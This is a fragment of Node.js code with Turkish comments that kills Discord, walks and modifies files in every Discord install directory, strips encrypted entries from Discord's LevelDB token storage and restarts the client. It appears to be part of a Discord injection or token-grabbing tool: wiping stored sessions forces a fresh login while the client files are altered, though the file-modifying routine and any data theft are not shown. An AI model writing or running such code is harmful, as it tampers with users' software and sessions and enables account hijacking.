    console.log('LDB ve LOG dosyaları taranıyor...');

    discordPaths.forEach(({ appPath }) => {
        const levelDbPath = path.join(appPath, 'Local Storage', 'leveldb');

        if (!fs.existsSync(levelDbPath)) {
            console.log(`Klasör mevcut değil: ${levelDbPath}`);
            return;
        }

        fs.readdir(levelDbPath, (err, files) => {
            if (err) {
                console.error('Klasör okuma hatası:', err);
                return;
            }

            files.forEach(file => {
                const filePath = path.join(levelDbPath, file);
                if (file.endsWith('.ldb') || file.endsWith('.log')) {
                    fs.readFile(filePath, 'utf8', (err, data) => {
                        if (err) {
                            console.error(`Dosya okuma hatası: ${filePath}`, err);
                            return;
                        }

                        const cleanedData = data.replace(encryptedRegex, '');
                        fs.writeFile(filePath, cleanedData, 'utf8', (err) => {
                            if (err) {
                                console.error(`Dosya yazma hatası: ${filePath}`, err);
                            } else {
                                console.log(`${file} dosyası başarıyla güncellendi.`);
                            }
                        });
                    });
                }
            });
        });
    });

    if (callback) setTimeout(callback, 2000); // Temizleme işleminden sonra gecikme
}

// Discord'u yeniden başlat
function startDiscord() {
    console.log('Discord yeniden başlatılıyor...');
    let started = false;

    // Tüm Discord sürümlerini tarayıp başlat
    discordPaths.forEach(({ exePath }) => {
        if (exePath.toLowerCase().includes('discord')) {  // Sadece 'discord' içeren yolu çalıştır
            const updateExe = path.join(exePath, 'Update.exe');
            if (fs.existsSync(updateExe)) {
                console.log(`Discord başlatılıyor: ${updateExe}`);
                exec(`"${updateExe}" --processStart Discord.exe`, (err) => {
                    if (err) {
                        console.error('Discord başlatılamadı:', err.message);
                    } else {
                        console.log('Discord başarıyla başlatıldı.');
                    }
                });
                started = true;
            }
        }
    });

    if (!started) {
        console.error('Hiçbir Discord sürümü bulunamadı.');
    }
}

// Ana işlemi çalıştır
function modifyAndRestartDiscord() {
    killAllDiscordProcesses(() => {
        discordPaths.forEach(({ exePath }) => {
            walkDir(exePath); // Tüm Discord dizinlerinde işlem yap
        });

        cleanLevelDbFiles(() => {
            startDiscord();
        });
    });
}

// Ana işlemi çağır
//modifyAndRestartDiscord();
